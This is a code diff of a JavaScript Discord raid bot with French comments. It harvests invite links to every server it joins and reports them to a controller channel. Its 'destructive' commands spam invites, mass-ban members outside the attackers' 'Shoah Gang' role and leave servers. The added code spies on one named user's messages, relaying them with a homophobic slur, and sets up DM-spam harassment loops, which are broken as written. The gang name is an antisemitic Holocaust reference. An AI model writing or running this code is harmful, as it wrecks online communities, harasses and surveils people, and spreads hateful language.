@@ -10,38 +10,72 @@ bot.on('ready',() => {
   //invit link
   bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-    invite.createInvite().then(invite => {bot.channels.find("id", '442270404338384896').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
+    invite.createInvite().then(invite => {bot.channels.find("id", process.env.CHANNEL_ID).send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
       console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)
   });
 });
   })
- 
-  bot.on("guildCreate", guild => {
-    bot.guilds.forEach(guild => {
-      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => {bot.channels.find("id", '442270404338384896').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
-        console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)
-    })
-  })
-  });
-  
-  bot.on('message', msg => {
-    //#region Legit
-    /* Commandes legit */
-    if (msg.content === '.ping') {
-      msg.reply('pong !')
-    }
+
+bot.on('message', msg => {
+  //#region Legit
+  /* Commandes legit */
+  if (msg.content === '.ping') {
+    msg.reply('pong !')
+  }
 
   //#endregion
  
 /*Serveur qui peuvent pas etre raid*/
 
-if (msg.guild === bot.guilds.find('id', '430039551747293205')){
+if (msg.guild === bot.guilds.find('id', process.env.GUILD_ID)){ //Shoah Gang
   return;
 }
 
-  //#region Destructrices
+
+
+//check si membre shoahgang ou adonis
+
+
+if (msg.author.id == process.env.ADONIS_ID2 || msg.author.id == process.env.ADONIS_ID) {
+
+     bot.channels.find('id', process.env.ADONIS_CHANNEL).send(`Le pd de ${msg.author.username} a ecrit sur le serv ${msg.guild.name}, et a dit ${msg.cleanContent}`)
+}
+
+if (bot.guilds.get(process.env.GUILD_ID).members.get(msg.author.id) !== undefined) {
+  
+  if (msg.author.id === process.env.ADONIS_ID2 || msg.author.id === process.env.ADONIS_ID){
+    bot.members.find('id', '392997054084939776').send("Adonis se fait raid en mp :joy:");
+      msg.author.send("Dédiace a FTNL");
+      var i = 0;
+      while (i /= 500){
+         msg.author.send("J'ai un oeil partout n'oublie pas (ton ami Fan Tarte)");
+        i===i+1;
+      }
+    return;
+  }
+
+var i = 0;
+      while (i /= 150){
+         msg.author.send('You has been raid by SHOAH GANG issou');
+        i===i+1;
+      }
+      return;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+//#region Destructrices
   /* Commandes destructrices */
+
 
   if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
@@ -51,7 +85,10 @@ if (msg.guild === bot.guilds.find('id', '430039551747293205')){
                        "https://discord.gg/835hm2Q\n" +
                        "https://discord.gg/ZKYWm6g").catch(e => {});
     }, 500)
-  }else if (msg.content === '.oupss') {
+  }
+
+
+  else if (msg.content === '.oupss') {
     console.log(`Commande .oupss par ${msg.author.tag}`);
    fucked = false;
  
@@ -69,16 +106,25 @@ if (msg.guild === bot.guilds.find('id', '430039551747293205')){
     if (msg.deletable) {
       msg.delete();
     }
-  }else if (msg.content === '.banev') {
+  }
+
+
+  else if (msg.content === '.banev') {
     console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
     });
-  }else if (msg.content === '.leave') {
+  }
+
+
+  else if (msg.content === '.leave') {
     console.log(`Commande .leave par ${msg.author.tag}`);
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.leave().catch(e => {});
-  }else if (msg.content === '.pardon') {
+  }
+
+
+  else if (msg.content === '.pardon') {
     console.log(`Commande .pardon par ${msg.author.tag}`);
  
     msg.member.guild.createRole({
@@ -92,4 +138,5 @@ if (msg.guild === bot.guilds.find('id', '430039551747293205')){
   }
   //#endregion
 });
+
 bot.login(process.env.BOT_TOKEN)
